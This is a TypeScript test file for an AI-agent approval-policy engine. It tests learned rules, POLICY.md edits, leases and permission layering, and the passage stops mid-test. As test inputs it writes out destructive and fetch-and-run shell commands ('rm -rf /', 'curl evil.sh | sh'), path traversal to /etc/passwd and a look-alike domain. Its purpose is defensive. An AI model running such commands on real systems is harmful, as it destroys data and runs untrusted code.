import { test, type TestContext } from "node:test";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { mkdirSync, readFileSync, writeFileSync } from "node:fs";
import { dirname, join } from "node:path";
import type { Approval, Goal, Task } from "@agent-room/shared";
import { buildServer } from "../src/api/server.js";
import { ControlFolder } from "../src/control/folder.js";
import { addRules, removeRules, setBodyLine, type RuleOut } from "../src/policy/file.js";
import { learn, learnedId } from "../src/policy/learn.js";
import { formatMatch, matches, parseMatch } from "../src/policy/match.js";
import { commandPrefix, narrowOf, shapeOf, twoKeyClass, verbOf } from "../src/policy/shape.js";
import { id } from "../src/util.js";
import { setup } from "./helpers.js";

type Ctx = ReturnType<typeof setup>;

// ---------------------------------------------------------------- helpers

const git = (root: string, ...args: string[]) => execFileSync("git", args, { cwd: root, encoding: "utf8" });
const commits = (root: string) => git(root, "log", "--format=%an|%s").trim().split("\n").filter(Boolean);
const read = (root: string, rel: string) => readFileSync(join(root, rel), "utf8");
const write = (root: string, rel: string, text: string) => { mkdirSync(dirname(join(root, rel)), { recursive: true }); writeFileSync(join(root, rel), text); };
const MIN = 60_000, HOUR = 3_600_000, DAY = 86_400_000;
const T0 = Date.parse("2026-10-23T18:00:00Z"); // 1 pm in Chicago: outside quiet hours
const isoDay = (ms: number) => new Date(ms).toISOString().slice(0, 10);
const audits = (c: { store: Ctx["store"] }) => c.store.listAudit(1000);
const auditHas = (c: { store: Ctx["store"] }, action: string, part = "") => audits(c).some((a) => a.action === action && a.detail.includes(part));

/** A hub with a control folder, a fake clock for the policy engine, the control folder and the attention gate, and a "board" room. */
async function mk(t: TestContext) {
  const ctx = setup();
  const clock = { t: T0 };
  for (const [agent, tools] of [["claude", { drive: true, gmail: true, shell: true, slack: true }], ["codex", { drive: false, shell: false, gmail: false }]] as const) {
    const a = ctx.store.getAgent(agent)!;
    ctx.store.saveAgent({ ...a, tools: { ...a.tools, ...tools }, ...(agent === "claude" ? { autoApprove: { shell: true } } : {}) });
  }
  ctx.store.createRoom("board", { topic: "Board prep" });
  const root = join(ctx.dir, "Agent Room");
  const control = new ControlFolder(root, ctx.store, { debounceMs: 40, ownerName: "Blake", watch: false, today: () => isoDay(clock.t), now: () => clock.t });
  await control.init();
  control.start();
  ctx.orch.control = control;
  ctx.orch.policy.clock = () => clock.t;
  ctx.orch.attention.clock = () => clock.t;
  const pushes: string[] = [];
  ctx.orch.attention.push = (title) => { pushes.push(title); };
  t.after(async () => { ctx.orch.policy.stop(); await ctx.orch.policy.idle(); await control.close(); });
  const general = ctx.store.listRooms().find((r) => r.name === "general")!;
  const board = ctx.store.listRooms().find((r) => r.name === "board")!;
  return { ...ctx, control, root, clock, pushes, general, board, policy: ctx.orch.policy };
}
type C = Awaited<ReturnType<typeof mk>>;

/** The owner answered `n` approvals of one shape by hand. Timestamps run up to the fake "now". */
function answered(c: C, n: number, status: "approved" | "rejected", o: { tool: string; action: string; detail: (i: number) => string; agentId?: string; auto?: boolean }) {
  for (let i = 0; i < n; i++) {
    const at = c.clock.t - (n - i) * MIN;
    c.store.saveApproval({ id: id("apr"), agentId: o.agentId ?? "claude", roomId: c.general.id, tool: o.tool, action: o.action, detail: o.detail(i), status, createdAt: at - 1000, decidedAt: at, ...(o.auto ? { auto: true } : {}) });
  }
}
const driveRead = { tool: "drive", action: "read", detail: (i: number) => `/Board/q3/notes-${i}.md` };

/** Put rules in POLICY.md the way the owner would in an editor, then let the hub read it. */
async function ownerRules(c: C, rules: Partial<RuleOut>[], line = "") {
  const rs = rules.map((r, i) => ({ id: `own-${i}-${id("x").slice(-4)}`, effect: "allow", tool: "drive", match: "action:read", scope: "agent:claude", source: "owner", accepted: true, ...r }) as RuleOut);
  let text = read(c.root, "POLICY.md");
  text = addRules(text, rs.map((rule) => ({ rule, line, section: "learned" as const })), "owner", isoDay(c.clock.t));
  write(c.root, "POLICY.md", text);
  await c.control.load();
  return rs.map((r) => r.id);
}

const ask = (c: C, grant: { agentId?: string; roomId?: string; taskId?: string }, tool: string, action: string, detail: string) =>
  c.orch.requestApproval({ agentId: grant.agentId ?? "claude", roomId: grant.roomId ?? c.general.id, taskId: grant.taskId }, tool, action, detail);

/** An approval that waits for the owner: true when requestApproval put a card in front of them. */
async function pending(c: C, p: Promise<Approval>) {
  const settled = await Promise.race([p.then(() => "settled"), new Promise((r) => setTimeout(() => r("waiting"), 40))]);
  return settled === "waiting";
}
async function declineAll(c: C, ps: Promise<Approval>[]) { for (const a of c.store.listApprovals("pending")) c.approvals.decide(a.id, "rejected"); await Promise.all(ps); }

function runningGoal(c: C, roomId = c.general.id, status: Goal["status"] = "running"): Goal {
  const g: Goal = { id: id("goal"), roomId, text: "Prepare the board packet", status, createdAt: c.clock.t };
  c.store.saveGoal(g);
  return g;
}
function runningTask(c: C, goal: Goal, assignee = "claude"): Task {
  const task = { id: id("task"), roomId: goal.roomId, goalId: goal.id, title: "Draft", description: "", taskType: "writing", acceptance: "", dependsOn: [], assignee, status: "running" } as unknown as Task;
  c.store.saveTask(task);
  return task;
}

async function boot(t: TestContext) {
  const c = await mk(t);
  const app = await buildServer({ store: c.store, orch: c.orch, approvals: c.approvals, ownerName: "Blake" });
  await app.listen({ host: "127.0.0.1", port: 0 });
  t.after(() => app.close());
  const base = `http://127.0.0.1:${(app.server.address() as { port: number }).port}`;
  const code = (app as unknown as { pairingCode: () => string }).pairingCode();
  const pr = await fetch(`${base}/pair`, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ code, deviceName: "Mac" }) });
  const { token } = (await pr.json()) as { token: string };
  return { ...c, app, base, token };
}
async function api(c: { base: string; token: string }, method: string, path: string, body?: unknown) {
  const res = await fetch(`${c.base}${path}`, { method, headers: { authorization: `Bearer ${c.token}`, "content-type": "application/json" }, body: body === undefined ? undefined : JSON.stringify(body) });
  return { status: res.status, body: (await res.json()) as any };
}

// ---------------------------------------------------------------- shapes and matches

test("shape: verbs, paths, recipients and commands come out of tool-style and free-text requests alike", () => {
  assert.equal(verbOf("Read"), "read");
  assert.equal(verbOf("Bash"), "run");
  assert.equal(verbOf("mcp__gmail__send_message"), "send");
  assert.equal(verbOf("Send email to Bob"), "send");
  const d = shapeOf("drive", "read", JSON.stringify({ path: "/Board/Q3/deck.md" }));
  assert.deepEqual(d.paths, ["/Board/Q3/deck.md"]);
  assert.deepEqual(narrowOf(d), { kind: "path", value: "/Board" });
  assert.deepEqual(shapeOf("drive", "Read /Board/Q3/deck.md", "").paths, ["/Board/Q3/deck.md"], "free text works too");
  assert.deepEqual(shapeOf("drive", "read", "https://example.com/a/b").paths, [], "a web address isn't a Drive path");
  assert.deepEqual(shapeOf("drive", "read", "../etc/passwd").paths, ["/.."], "a relative path that climbs out is marked, never matched");
  assert.deepEqual(shapeOf("drive", "read", JSON.stringify({ path: "/Board/../Secret/x" })).paths, ["/.."], "a path that climbs out is marked, never matched");
  const mail = shapeOf("gmail", "send", JSON.stringify({ to: ["bob@atmosphere.tv", "Amy <amy@Atmosphere.tv>"], body: "cc carol@gmail.com later" }));
  assert.deepEqual(mail.domains, ["atmosphere.tv"], "only the recipients count, not an address in the body");
  assert.deepEqual(narrowOf(mail), { kind: "to", value: "atmosphere.tv" });
  assert.equal(narrowOf(shapeOf("gmail", "send", JSON.stringify({ to: ["a@atmosphere.tv", "b@other.com"] }))), undefined, "two domains is no stable shape");
  const sh = shapeOf("shell", "Bash", JSON.stringify({ command: "npm test -- --watch=false" }));
  assert.equal(sh.command, "npm test -- --watch=false");
  assert.deepEqual(narrowOf(sh), { kind: "cmd", value: "npm test" });
  assert.equal(commandPrefix("npm run build"), "npm run build");
  assert.equal(commandPrefix("git push origin main"), "git push");
  for (const bad of ["rm -rf x", "bash -c 'x'", "npm", "node -e 1", "curl http://x", "npm test && rm -rf /"]) assert.equal(commandPrefix(bad), undefined, bad);
});

test("match: an allow needs every path, recipient and the whole command to fit; a deny or ask needs one", () => {
  const m = (s: string) => { const p = parseMatch(s); assert.ok(p.ok, s); return p; };
  const drive = (detail: string) => shapeOf("drive", "read", detail);
  assert.equal(matches(m("action:read path:/Board"), drive("/Board/q3/x.md"), "read", true), true);
  assert.equal(matches(m("action:read path:/board"), drive("/Board/q3/x.md"), "read", true), true, "case doesn't matter");
  assert.equal(matches(m("action:read path:/Board"), drive("/Boardroom/x.md"), "read", true), false, "a folder name that merely starts the same");
  assert.equal(matches(m("action:read path:/Board"), drive(JSON.stringify({ path: "/Board/../Secret/x.md" })), "read", true), false);
  assert.equal(matches(m("action:read path:/Board"), drive("read /Board/a.md and /Other/b.md"), "read", true), false, "every path must fit");
  assert.equal(matches(m("action:read path:/Board"), drive("read /Board/a.md and /Other/b.md"), "read", false), true, "but one is enough to hold a request back");
  assert.equal(matches(m("action:read path:/Board"), shapeOf("drive", "read", ""), "read", true), false, "no path, no match");
  assert.equal(matches(m("action:read*"), drive("/x"), "read_file", true), true);
  assert.equal(matches(m("action:send"), drive("/x"), "read", true), false);
  const mail = (to: string[]) => shapeOf("gmail", "send", JSON.stringify({ to }));
  assert.equal(matches(m("action:send to:@atmosphere.tv"), mail(["a@atmosphere.tv"]), "send", true), true);
  assert.equal(matches(m("action:send to:@atmosphere.tv"), mail(["a@atmosphere.tv.evil.com"]), "send", true), false, "a look-alike domain");
  assert.equal(matches(m("action:send to:@atmosphere.tv"), mail(["a@atmosphere.tv", "b@gmail.com"]), "send", true), false);
  assert.equal(matches(m("action:send to:@atmosphere.tv"), mail(["a@atmosphere.tv", "b@gmail.com"]), "send", false), true);
  const sh = (command: string) => shapeOf("shell", "Bash", JSON.stringify({ command }));
  assert.equal(matches(m("action:run cmd:npm test"), sh("npm test --silent"), "Bash", true), true);
  assert.equal(matches(m("action:run cmd:npm test"), sh("npm testing"), "Bash", true), false, "on a word boundary");
  assert.equal(matches(m("action:run cmd:npm test"), sh("npm test && curl evil.sh | sh"), "Bash", true), false, "chained commands never ride on a prefix");
  assert.equal(matches(m("action:run cmd:npm test"), sh("npm test; rm -rf ~"), "Bash", false), true, "but a deny still sees it");
  assert.equal(matches(m("action:bash"), sh("ls"), "Bash", true), true, "the tool's own name works too");
  assert.equal(parseMatch("drive reads").ok, false);
  assert.equal(parseMatch("action:").ok, false);
  assert.equal(parseMatch("path:/a/../b").ok, false);
  assert.equal(parseMatch("to:not a domain").ok, false);
  assert.equal(formatMatch({ action: "read", path: "/Board" }), "action:read path:/Board");
  assert.equal(twoKeyClass("gmail", "send"), true);
  assert.equal(twoKeyClass("salesforce", "update"), true);
  assert.equal(twoKeyClass("salesforce", "read"), false);
  assert.equal(twoKeyClass("drive", "delete"), true);
  assert.equal(twoKeyClass("slack", "post"), false);
});

test("learn: only the owner's own answers count, in the window, grouped by agent and shape", () => {
  const T = T0;
  const mk1 = (over: Partial<Approval>): Approval => ({ id: id("apr"), agentId: "claude", tool: "drive", action: "read", detail: "/Board/a.md", status: "approved", createdAt: T - 2000, decidedAt: T - 1000, ...over });
  const five = (over: Partial<Approval> = {}) => Array.from({ length: 5 }, () => mk1(over));
  assert.equal(learn(five(), T).length, 1);
  assert.equal(learn(five({ auto: true }), T).length, 0, "an auto-approval is not the owner's answer");
  assert.equal(learn(five({ proposalId: "p1" }), T).length, 0, "file-write proposals are never learned");
  assert.equal(learn(five({ status: "expired" }), T).length, 0, "a timeout isn't an answer");
  assert.equal(learn(five({ decidedAt: T - 40 * DAY }), T).length, 0, "too old");
  assert.equal(learn(five({ agentId: "codex" }), T)[0].scope, "agent:codex", "per agent");
  assert.equal(learn([...five().slice(0, 4), ...five({ agentId: "codex" }).slice(0, 4)], T).length, 0, "two agents' answers aren't pooled");
  assert.equal(learn(five().slice(0, 4), T).length, 0, "four isn't enough");
  const mixed = [...five().slice(0, 3), ...five({ status: "rejected" }).slice(0, 2)];
  const p = learn(mixed, T);
  assert.equal(p.length, 1); assert.equal(p[0].effect, "ask");
  assert.equal(learn([...five(), mk1({ status: "rejected" })], T)[0].effect, "ask", "one rejection spoils an allow");
  assert.equal(learn(five({ tool: "shell", action: "Bash", detail: JSON.stringify({ command: "rm -rf x" }) }), T).length, 0, "no stable command, nothing to learn");
  assert.equal(learn(five({ tool: "gmail", action: "send", detail: JSON.stringify({ body: "hi" }) }), T).length, 0, "a send with no recipient is too wide to learn");
  assert.equal(learn(five({ tool: "gmail", action: "send", detail: JSON.stringify({ to: "a@atmosphere.tv" }) }), T).length, 0, "a send is the two-key check's: never learned as an allow");
  const one = learn(five({ tool: "gmail", action: "draft", detail: JSON.stringify({ to: "a@atmosphere.tv" }) }), T)[0];
  assert.equal(one.match, "action:draft to:@atmosphere.tv");
  assert.equal(one.id, learnedId("claude", "gmail", "draft", { kind: "to", value: "atmosphere.tv" }));
});

test("file: rules and their plain lines go in and out of POLICY.md without touching what the owner wrote", () => {
  const base = `---\nkind: policy\nschema: 1\nupdated: 2026-10-01\nupdated_by: owner\ndefaults:\n  shell: ask\nrules: []\n---\n\n# Approval rules\n\nMy own note.\n`;
  const rule: RuleOut = { id: "learned-abc12345", effect: "allow", tool: "drive", match: "action:read path:/Board", scope: "agent:claude", source: "learned", accepted: false };
  const a = addRules(base, [{ rule, line: "Allow Claude's Drive reads in /Board: you approved 5 of 5 since Oct 12.", section: "learned" }], "hub", "2026-10-23");
  assert.match(a, /## Learned from your approvals/);
  assert.match(a, /- Allow Claude's Drive reads in \/Board: you approved 5 of 5 since Oct 12\. \[learned-abc12345\]/);
  assert.match(a, /My own note\./);
  assert.match(a, /updated_by: hub/);
  assert.equal(addRules(a, [{ rule, line: "again", section: "learned" }], "hub", "2026-10-23"), a, "the same id isn't added twice");
  const lease = setBodyLine(a, "lease", "lease-ff00aa", "Allow Claude's Slack posts (30 minutes).");
  assert.match(lease, /## Active leases/);
  const back = removeRules(lease, ["learned-abc12345"], "owner", "2026-10-23");
  assert.doesNotMatch(back, /Learned from your approvals/, "an empty section goes away");
  assert.match(back, /Active leases/);
  assert.match(back, /My own note\./);
  assert.match(removeRules(back, ["lease-ff00aa"], "owner", "2026-10-23"), /rules: \[\]|rules:\s*\n?\s*\[\]/);
});

// ---------------------------------------------------------------- AC1: approval history becomes readable rules

test("AC1: five approvals of one shape become one learned allow rule in POLICY.md, unaccepted and not applied", async (t) => {
  const c = await mk(t);
  answered(c, 5, "approved", driveRead);
  answered(c, 3, "approved", { tool: "slack", action: "post", detail: () => "to #general", auto: true }); // auto-approvals teach nothing
  answered(c, 2, "approved", { tool: "shell", action: "Bash", detail: () => JSON.stringify({ command: "ls" }) }); // too few
  const r = await c.policy.learn();
  assert.equal(r.proposed.length, 1);
  assert.equal(r.proposed[0], learnedId("claude", "drive", "read", { kind: "path", value: "/Board" }));

  const text = read(c.root, "POLICY.md");
  assert.match(text, /id: learned-[0-9a-f]{8}\n\s+effect: allow\n\s+tool: drive\n\s+match: action:read path:\/Board\n\s+scope: agent:claude\n\s+source: learned\n\s+accepted: false/);
  assert.match(text, /- Allow Claude's Drive reads in \/Board: you approved 5 of 5 since Oct 23\. \[learned-[0-9a-f]{8}\]/);
  assert.match(commits(c.root)[0], /^hub\|Proposed 1 approval rule from your approvals$/);

  // surfaced once, through the attention gate
  assert.deepEqual(c.pushes, ["1 new approval rule to review"]);
  assert.ok(auditHas(c, "policy.proposed", r.proposed[0]));

  // the file is valid and the rule is waiting
  assert.deepEqual(c.control.lint().blocks, []);
  const state = c.policy.state();
  assert.equal(state.pending, 1);
  assert.equal(state.rules.find((x) => x.id === r.proposed[0])!.kind, "learned");
  assert.equal(state.rules.find((x) => x.id === r.proposed[0])!.accepted, false);

  // not applied: the next request still goes to the owner
  const p = ask(c, {}, "drive", "read", "/Board/q4/new.md");
  assert.equal(await pending(c, p), true);
  assert.equal(c.policy.policyDecision("claude", c.general.id, undefined, "drive", "read", "/Board/q4/new.md"), "none");
  await declineAll(c, [p]);

  // at most one batch a day
  answered(c, 5, "approved", { tool: "drive", action: "write", detail: (i) => `/Board/out-${i}.md` });
  assert.deepEqual(await c.policy.learn(), { proposed: [], skipped: "already proposed today" });
  c.clock.t += DAY;
  c.pushes.length = 0;
  answered(c, 5, "approved", { tool: "drive", action: "write", detail: (i) => `/Board/out-${i}.md` });
  assert.equal((await c.policy.learn()).proposed.length, 1, "the next day's batch");
  assert.deepEqual(c.pushes, ["1 new approval rule to review"]);
});

test("AC1: accepting a proposal applies it at the approval path: auto-approved, recorded like auto, and audited", async (t) => {
  const c = await mk(t);
  answered(c, 5, "approved", driveRead);
  const [ruleId] = (await c.policy.learn()).proposed;
  const accepted = await c.policy.accept(ruleId);
  assert.equal(accepted.ok, true);
  assert.match(read(c.root, "POLICY.md"), /accepted: true/);
  assert.match(commits(c.root)[0], /^owner\|Accepted rule learned-/);
  assert.ok(auditHas(c, "policy.accepted", ruleId));
  assert.equal(c.policy.state().pending, 0);

  const res = await ask(c, {}, "drive", "read", "/Board/q4/new.md");
  assert.equal(res.status, "approved");
  assert.equal(res.auto, true, "recorded like an auto-approval");
  assert.ok(c.store.getApproval(res.id), "and saved in the approvals table");
  assert.ok(auditHas(c, "approval.auto", "drive: read"));
  assert.ok(auditHas(c, "policy.allowed", ruleId));
  assert.deepEqual(c.store.listApprovals("pending"), []);

  // only what the rule covers: another agent, another folder, a path that climbs out, and a different verb still ask
  const other = [
    ask(c, { agentId: "codex" }, "drive", "read", "/Board/q4/new.md"),
    ask(c, {}, "drive", "read", "/Finance/q4.xlsx"),
    ask(c, {}, "drive", "read", JSON.stringify({ path: "/Board/../Finance/q4.xlsx" })),
    ask(c, {}, "drive", "write", "/Board/q4/new.md"),
  ];
  for (const p of other) assert.equal(await pending(c, p), true);
  await declineAll(c, other);

  // the auto-approval doesn't feed the next round of learning
  answered(c, 5, "approved", driveRead);
  assert.equal(learn(c.store.listApprovals(), c.clock.t).filter((p) => p.id === ruleId).length, 1);
});

test("AC1: three rejections propose a deny; accepted, it refuses the request without a card, even for an agent that runs it without asking", async (t) => {
  const c = await mk(t);
  const publish = { tool: "shell", action: "Bash", detail: () => JSON.stringify({ command: "npm publish --tag next" }) };
  answered(c, 3, "rejected", publish);
  const [ruleId] = (await c.policy.learn()).proposed;
  const file = read(c.root, "POLICY.md");
  assert.match(file, /effect: deny\n\s+tool: shell\n\s+match: action:run cmd:npm publish/);
  assert.match(file, /Deny Claude's shell command "npm publish": you rejected 3 of 3 since Oct 23\./);
  await c.policy.accept(ruleId);
  const res = await ask(c, {}, "shell", "Bash", JSON.stringify({ command: "npm publish" }));
  assert.equal(res.status, "rejected");
  assert.deepEqual(c.store.listApprovals("pending"), [], "no card");
  assert.ok(auditHas(c, "policy.denied", ruleId));
  assert.equal((await ask(c, {}, "shell", "Bash", JSON.stringify({ command: "npm test" }))).auto, true, "the agent's own auto-approval still covers other commands");
});

test("AC1: a mixed history proposes ask with a note, and an accepted ask beats 'run without asking'", async (t) => {
  const c = await mk(t);
  const sh = { tool: "shell", action: "Bash", detail: () => JSON.stringify({ command: "git push origin main" }) };
  answered(c, 3, "approved", sh); answered(c, 2, "rejected", sh);
  const [ruleId] = (await c.policy.learn()).proposed;
  assert.match(read(c.root, "POLICY.md"), /Always ask before Claude's shell command "git push": you approved 3 and rejected 2 since Oct 23\./);
  await c.policy.accept(ruleId);
  const p = ask(c, {}, "shell", "Bash", JSON.stringify({ command: "git push" }));
  assert.equal(await pending(c, p), true, "Claude auto-approves shell, but this rule always asks");
  assert.ok(auditHas(c, "policy.asked", ruleId));
  await declineAll(c, [p]);
});

test("AC1: the owner edits a proposal before accepting it, or deletes it: a deleted proposal isn't proposed again for 30 days", async (t) => {
  const c = await mk(t);
  c.policy.config.windowDays = 365;
  answered(c, 5, "approved", driveRead);
  const [ruleId] = (await c.policy.learn()).proposed;

  const bad = await c.policy.edit(ruleId, { match: "drive reads please" });
  assert.equal(bad.ok, false);
  const edited = await c.policy.edit(ruleId, { effect: "ask", match: "action:read path:/Board/Q3", accepted: true });
  assert.equal(edited.ok, true);
  const rule = c.control.snapshot().policy!.fm.rules.find((r) => r.id === ruleId)!;
  assert.deepEqual([rule.effect, rule.match, rule.accepted, rule.source], ["ask", "action:read path:/Board/Q3", true, "learned"]);
  assert.match(c.control.snapshot().policy!.body, /\(edited\) \[learned-/);

  const gone = await c.policy.remove(ruleId);
  assert.equal(gone.ok, true);
  assert.doesNotMatch(read(c.root, "POLICY.md"), /learned-/);
  assert.ok(auditHas(c, "policy.deleted", ruleId));
  c.clock.t += DAY;
  assert.deepEqual((await c.policy.learn()).proposed, [], "remembered");
  c.clock.t += 20 * DAY; // day 21
  assert.deepEqual((await c.policy.learn()).proposed, [], "still remembered");
  c.clock.t += 10 * DAY; // day 31
  assert.equal((await c.policy.learn()).proposed.length, 1, "after 30 days it may be proposed again");
});

test("AC1: a proposal the owner deletes in the file is remembered too", async (t) => {
  const c = await mk(t);
  answered(c, 5, "approved", driveRead);
  const [ruleId] = (await c.policy.learn()).proposed;
  write(c.root, "POLICY.md", removeRules(read(c.root, "POLICY.md"), [ruleId], "owner", isoDay(c.clock.t)));
  await c.control.load();
  c.clock.t += DAY;
  answered(c, 5, "approved", driveRead);
  assert.deepEqual((await c.policy.learn()).proposed, []);
  assert.deepEqual(c.control.lint().blocks, []);
});

test("AC1: the owner's edits in POLICY.md take effect on the very next request", async (t) => {
  const c = await mk(t);
  const grant = { agentId: "claude", roomId: c.general.id };
  const read1 = () => c.policy.policyDecision("claude", c.general.id, undefined, "drive", "read", "/Board/a.md");
  assert.equal(read1(), "none");
  const [rid] = await ownerRules(c, [{ match: "action:read path:/Board" }]);
  assert.equal(read1(), "allow");
  assert.equal((await ask(c, grant, "drive", "read", "/Board/a.md")).auto, true);

  // flip the effect in an editor
  write(c.root, "POLICY.md", read(c.root, "POLICY.md").replace(/effect: allow\n(\s+)tool: drive/, "effect: deny\n$1tool: drive"));
  await c.control.load();
  assert.equal(read1(), "deny");
  assert.equal((await ask(c, grant, "drive", "read", "/Board/a.md")).status, "rejected");

  // unaccept, then remove
  write(c.root, "POLICY.md", read(c.root, "POLICY.md").replace(new RegExp(`(id: ${rid}[\\s\\S]*?accepted: )true`), "$1false"));
  await c.control.load();
  assert.equal(read1(), "none");
  write(c.root, "POLICY.md", removeRules(read(c.root, "POLICY.md"), [rid], "owner", isoDay(c.clock.t)));
  await c.control.load();
  assert.equal(read1(), "none");

  // a rule with an expiry date stops on its own, a rule in another scope never started
  await ownerRules(c, [{ match: "action:read path:/Board", expires: "2026-10-23" }, { match: "action:read path:/Finance", scope: "room:board" }]);
  assert.equal(read1(), "allow", "good through its date");
  assert.equal(c.policy.policyDecision("claude", c.general.id, undefined, "drive", "read", "/Finance/x"), "none", "the rule is for another room");
  assert.equal(c.policy.policyDecision("claude", c.board.id, undefined, "drive", "read", "/Finance/x"), "allow");
  c.clock.t += DAY;
  assert.equal(read1(), "none");

  // a rule the hub can't read says so, and never applies
  await ownerRules(c, [{ match: "drive reads", tool: "drive" }]);
  assert.ok(c.control.lint().flags.some((f) => /can't read \("drive reads"\)/.test(f.message)));
});

test("layers only tighten: a POLICY allow can't override ROOM.md off or ask, a switched-off tool, or the two-key check", async (t) => {
  const c = await mk(t);
  await ownerRules(c, [{ match: "action:read path:/Board", scope: "*" }, { tool: "gmail", match: "action:send to:@atmosphere.tv", scope: "*" }]);
  const detail = "/Board/a.md";

  // ROOM.md off: refused outright, the card never appears
  write(c.root, "rooms/board/ROOM.md", read(c.root, "rooms/board/ROOM.md").replace("tools: {}", "tools:\n  drive: off"));
  await c.control.load();
  const off = await ask(c, { roomId: c.board.id }, "drive", "read", detail);
  assert.equal(off.status, "rejected");
  assert.ok(auditHas(c, "room.denied", "drive"));
  assert.equal(c.policy.gate({ agentId: "claude", roomId: c.board.id }, c.store.getAgent("claude"), { agentId: "claude", roomId: c.board.id, tool: "drive", action: "read", detail }), undefined, "and policy itself does nothing");

  // ROOM.md ask: the card is still shown
  write(c.root, "rooms/board/ROOM.md", read(c.root, "rooms/board/ROOM.md").replace("drive: off", "drive: ask"));
  await c.control.load();
  const p = ask(c, { roomId: c.board.id }, "drive", "read", detail);
  assert.equal(await pending(c, p), true);
  await declineAll(c, [p]);
  assert.equal((await ask(c, { roomId: c.general.id }, "drive", "read", detail)).auto, true, "the other room has no such limit");

  // the agent's tool switch is off (Codex has no Drive)
  const q = ask(c, { agentId: "codex" }, "drive", "read", detail);
  assert.equal(await pending(c, q), true);
  await declineAll(c, [q]);

  // an owner's `ask` rule for the same action beats an allow
  await ownerRules(c, [{ effect: "ask", match: "action:read path:/Board/secret", scope: "*" }]);
  const s = ask(c, {}, "drive", "read", "/Board/secret/plan.md");
  assert.equal(await pending(c, s), true);
  await declineAll(c, [s]);

  // two-key: the allow doesn't stand in for the drafts check (Claude runs Gmail without asking here: an agent that asks first can't be carved out, see M5 below)
  c.store.saveAgent({ ...c.store.getAgent("claude")!, autoApprove: { shell: true, gmail: true } });
  await c.control.idle();
  assert.match(read(c.root, "agents/claude/TOOLS.md"), /gmail: on/);
  const mail = JSON.stringify({ to: ["amy@atmosphere.tv"], subject: "Hi" });
  assert.equal(c.policy.policyDecision("claude", c.general.id, undefined, "gmail", "send", mail), "allow");
  const m = ask(c, {}, "gmail", "send", mail);
  assert.equal(await pending(c, m), true, "email send still goes to the owner until the two-key check has passed");
  await declineAll(c, [m]);
  const g = c.policy.gate({ agentId: "claude", roomId: c.general.id }, c.store.getAgent("claude"), { agentId: "claude", roomId: c.general.id, tool: "gmail", action: "send", detail: mail }, { twoKeyPassed: true });
  assert.equal((await g!).auto, true, "once 4.1 says the drafts match, the allow can stand");
});

// ---------------------------------------------------------------- AC2: leases

test("AC2: a 30-minute lease allows the action, then expires on its own and the previous state comes back", async (t) => {
  const c = await mk(t);
  const before = c.control.snapshot().policy!.fm.rules.map((r) => r.id).sort();
  const drivePost = (n = "to #general") => ask(c, {}, "drive", "write", n);

  const p0 = drivePost();
  assert.equal(await pending(c, p0), true, "no lease: the owner is asked");
  await declineAll(c, [p0]);

  const g = await c.policy.grant({ agentId: "claude", tool: "drive", minutes: 30, action: "write" });
  assert.ok(g.ok);
  if (!g.ok) return;
  assert.equal(g.lease.remainingMs, 30 * MIN);
  assert.equal(g.lease.expiresAt, T0 + 30 * MIN);
  const file = read(c.root, "POLICY.md");
  assert.match(file, new RegExp(`id: ${g.lease.id}\\n\\s+effect: allow\\n\\s+tool: drive\\n\\s+match: action:write\\n\\s+scope: agent:claude\\n\\s+expires: 2026-10-23T18:30:00\\.000Z\\n\\s+source: owner\\n\\s+accepted: true`));
  assert.match(file, /## Active leases/);
  assert.match(file, new RegExp(`- Allow Claude's Drive writes until Oct 23, 1:30 PM CDT \\(for 30 minutes\\) \\[${g.lease.id}\\]`));
  assert.deepEqual(c.store.getKV<{ id: string }[]>("policy_leases", []).map((l) => l.id), [g.lease.id], "mirrored in the database");
  assert.ok(auditHas(c, "lease.granted", g.lease.id));
  assert.deepEqual(c.control.lint().blocks, []);

  assert.equal((await drivePost()).auto, true);
  c.clock.t = T0 + 29 * MIN;
  assert.equal((await drivePost()).auto, true, "still inside the lease");
  assert.equal(c.policy.leases()[0].remainingMs, MIN);
  const react = ask(c, {}, "drive", "read", "to #general");
  assert.equal(await pending(c, react), true, "only the verb that was leased");
  await declineAll(c, [react]);

  c.clock.t = T0 + 31 * MIN;
  const late = drivePost();
  assert.equal(await pending(c, late), true, "past its time the lease no longer applies, even before the sweep has run");
  await declineAll(c, [late]);
  assert.deepEqual(c.policy.leases(), []);

  // the sweep takes it out of the file and the database
  assert.deepEqual(await c.policy.sweep(), [g.lease.id]);
  assert.doesNotMatch(read(c.root, "POLICY.md"), /lease-/);
  assert.deepEqual(c.store.getKV("policy_leases", []), []);
  assert.deepEqual(c.control.snapshot().policy!.fm.rules.map((r) => r.id).sort(), before, "POLICY.md has the rules it had before");
  assert.ok(auditHas(c, "lease.expired", g.lease.id));
  assert.match(commits(c.root)[0], /^hub\|Lease ended: lease-/);
  assert.deepEqual(await c.policy.sweep(), [], "nothing left to do");
});

test("AC2: the timer removes an expired lease by itself", async (t) => {
  const c = await mk(t);
  const g = await c.policy.grant({ agentId: "claude", tool: "slack", minutes: 1, action: "post" });
  assert.ok(g.ok);
  c.clock.t += 2 * MIN;
  c.policy.start(); // start runs one sweep now and then every 30 seconds
  await c.policy.idle();
  assert.deepEqual(c.control.snapshot().policy!.fm.rules.filter((r) => r.id.startsWith("lease-")), []);
  assert.ok(auditHas(c, "lease.expired"));
});

test("AC2: a lease on a tool the agent doesn't have switches it on, and turns it back off when the lease ends", async (t) => {
  const c = await mk(t);
  assert.equal(c.store.getAgent("codex")!.tools.drive ?? false, false);
  const g = await c.policy.grant({ agentId: "codex", tool: "drive", minutes: 30, action: "write" });
  assert.ok(g.ok);
  if (!g.ok) return;
  assert.equal(g.lease.switchedOn, true);
  assert.match(g.notes.join(" "), /drive was off for Codex/);
  assert.equal(c.store.getAgent("codex")!.tools.drive, true);
  assert.equal((await ask(c, { agentId: "codex" }, "drive", "write", "to #general")).auto, true);
  assert.match(read(c.root, "agents/codex/TOOLS.md"), /drive: on/, "the switch is written to its files like any change in the app");

  c.clock.t += 31 * MIN;
  await c.policy.sweep();
  await c.control.idle();
  assert.equal(c.store.getAgent("codex")!.tools.drive, false, "back to what it was");
  assert.match(read(c.root, "agents/codex/TOOLS.md"), /drive: off/);
  assert.ok(auditHas(c, "lease.expired", "drive is off again"));

  // a layer that keeps the tool off can't be widened by a lease (the owner's own deny rule for Codex's Drive)
  await ownerRules(c, [{ effect: "deny", tool: "drive", match: "*", scope: "agent:codex" }]);
  const no = await c.policy.grant({ agentId: "codex", tool: "drive", minutes: 30, action: "write" });
  assert.equal(no.ok, false);
